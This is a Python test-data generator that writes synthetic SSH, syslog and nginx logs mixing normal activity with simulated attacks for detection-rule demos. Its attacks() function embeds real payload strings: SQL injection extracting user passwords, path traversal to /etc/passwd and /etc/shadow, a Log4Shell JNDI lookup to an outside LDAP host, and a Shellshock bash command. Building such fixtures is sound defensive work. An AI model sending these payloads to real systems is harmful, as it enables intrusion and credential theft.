"""Generate synthetic benign traffic and attack logs for demos and tests.

Deterministic for a given seed. Writes auth.log, syslog and nginx_access.log.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

START = datetime(2026, 10, 18, 0, 0, 0, tzinfo=timezone.utc)
HOST = "web01"
BROWSER = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36"
)
GOOD_IPS = ["10.0.0.7", "10.0.0.8", "10.0.0.21", "192.168.1.14"]
Line = tuple[datetime, str]


def _sys(t: datetime, prog: str, pid: int, msg: str) -> str:
    return f"{t.strftime('%b %e %H:%M:%S')} {HOST} {prog}[{pid}]: {msg}"


def _nginx(t, ip, method, path, status, ua=BROWSER, size=900):
    stamp = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def benign(rng: random.Random) -> dict[str, list[Line]]:
    """Normal activity that must NOT trigger any rule."""
    out: dict[str, list[Line]] = {"auth": [], "syslog": [], "nginx": []}
    for i in range(40):
        t = START + timedelta(minutes=rng.randint(0, 1400), seconds=rng.randint(0, 59))
        ip, user = rng.choice(GOOD_IPS), rng.choice(["alice", "bob", "carol"])
        if rng.random() < 0.1:  # an occasional typo
            msg = f"Failed password for {user} from {ip} port {40000 + i} ssh2"
            out["auth"].append((t, _sys(t, "sshd", 3000 + i, msg)))
        msg = f"Accepted publickey for {user} from {ip} port {41000 + i} ssh2"
        out["auth"].append((t + timedelta(seconds=5), _sys(t, "sshd", 3100 + i, msg)))
    for i in range(6):
        t = START + timedelta(hours=3 * i + 1, minutes=7)
        cmd = rng.choice(["/usr/bin/apt update", "/bin/systemctl restart nginx"])
        msg = f"  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND={cmd}"
        out["auth"].append((t, _sys(t, "sudo", 3200 + i, msg)))
    for i in range(48):
        t = START + timedelta(minutes=30 * i)
        out["syslog"].append(
            (t, _sys(t, "CRON", 3300 + i, "(root) CMD (/usr/local/bin/backup.sh)"))
        )
    for i in range(400):
        t = START + timedelta(seconds=rng.randint(0, 86000))
        ip = rng.choice(GOOD_IPS)
        path = rng.choice(
            [
                "/",
                "/products?id=12",
                "/static/app.css",
                "/search?q=union+station",
                "/about",
            ]
        )
        status = 404 if rng.random() < 0.03 else 200
        out["nginx"].append((t, _nginx(t, ip, "GET", path, status)))
    return out


def attacks(rng: random.Random) -> dict[str, list[Line]]:
    """One scenario per detection rule (the brute-force-then-success chain also
    produces the root login, new user, cron and sudo events)."""
    out: dict[str, list[Line]] = {"auth": [], "syslog": [], "nginx": []}

    def auth(t, prog, pid, msg):
        out["auth"].append((t, _sys(t, prog, pid, msg)))

    def web(t, ip, method, path, status, ua=BROWSER):
        out["nginx"].append((t, _nginx(t, ip, method, path, status, ua)))

    # SSH brute force from one IP, then a successful login and post-compromise steps
    t = START + timedelta(hours=1)
    for i in range(14):
        ts = t + timedelta(seconds=3 * i)
        auth(
            ts,
            "sshd",
            5000 + i,
            f"Failed password for deploy from 192.0.2.99 port {50000 + i} ssh2",
        )
    t += timedelta(seconds=60)
    auth(
        t, "sshd", 5100, "Accepted password for deploy from 192.0.2.99 port 50100 ssh2"
    )
    for i in range(3):
        ts = t + timedelta(seconds=20 + 15 * i)
        msg = "  deploy : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
        auth(ts, "sudo", 5200 + i, msg)
    ts = t + timedelta(seconds=90)
    auth(
        ts,
        "sudo",
        5210,
        "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
    )
    ts += timedelta(seconds=30)
    auth(
        ts,
        "useradd",
        5220,
        "new user: name=support, UID=1002, GID=1002, home=/home/support, shell=/bin/bash",
    )
    ts += timedelta(seconds=20)
    out["syslog"].append((ts, _sys(ts, "crontab", 5230, "(deploy) REPLACE (deploy)")))

    # Password spraying: one attempt per account, a couple of minutes apart
    t = START + timedelta(hours=4)
    for i, user in enumerate(
        ["admin", "oracle", "git", "test", "ubuntu", "pi", "postgres"]
    ):
        ts = t + timedelta(minutes=2 * i)
        auth(
            ts,
            "sshd",
            5300 + i,
            f"Failed password for invalid user {user} from 198.51.100.23 port {51000 + i} ssh2",
        )

    # Direct root login from outside
    t = START + timedelta(hours=6)
    auth(t, "sshd", 5400, "Accepted password for root from 192.0.2.77 port 40022 ssh2")

    # Failed su attempts by a web service account
    t = START + timedelta(hours=7)
    for i in range(4):
        ts = t + timedelta(seconds=20 * i)
        auth(ts, "su", 5500 + i, "FAILED SU (to root) www-data on pts/2")

    # Web: SQL injection with sqlmap
    t = START + timedelta(hours=9)
    for i in range(6):
        ts = t + timedelta(seconds=2 * i)
        web(
            ts,
            "198.51.100.77",
            "GET",
            "/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
            500,
            "sqlmap/1.7.2#stable (https://sqlmap.org)",
        )

    # Web: path traversal
    t = START + timedelta(hours=10)
    for i, p in enumerate(
        [
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fshadow",
            "%252e%252e%252fwin.ini",
        ]
    ):
        web(
            t + timedelta(seconds=5 * i),
            "192.0.2.140",
            "GET",
            f"/download?file={p}",
            400,
        )

    # Web: directory enumeration
    t = START + timedelta(hours=11)
    for i in range(80):
        web(
            t + timedelta(milliseconds=400 * i),
            "203.0.113.9",
            "GET",
            f"/{rng.choice(['admin', 'backup', 'old', 'test'])}{i}.php",
            404,
            "Mozilla/5.0 (compatible)",
        )

    # Web: login brute force
    t = START + timedelta(hours=12)
    for i in range(25):
        web(t + timedelta(seconds=4 * i), "203.0.113.200", "POST", "/wp-login.php", 403)

    # Web: Log4Shell and Shellshock probes
    t = START + timedelta(hours=13)
    web(t, "198.51.100.200", "GET", "/", 200, "${jndi:ldap://198.51.100.200:1389/a}")
    web(
        t + timedelta(minutes=30),
        "198.51.100.201",
        "GET",
        "/cgi-bin/status",
        500,
        "() { :;}; /bin/bash -c 'id'",
    )
    return out


def generate(out_dir: str, seed: int = 1, with_attacks: bool = True) -> list[str]:
    rng = random.Random(seed)
    parts = benign(rng)
    if with_attacks:
        for key, lines in attacks(rng).items():
            parts[key] += lines
    names = {"auth": "auth.log", "syslog": "syslog", "nginx": "nginx_access.log"}
    base = Path(out_dir)
    base.mkdir(parents=True, exist_ok=True)
    written = []
    for key, lines in parts.items():
        lines.sort(key=lambda x: x[0])
        path = base / names[key]
        path.write_text("".join(f"{text}\n" for _, text in lines), encoding="utf-8")
        written.append(str(path))
    return written
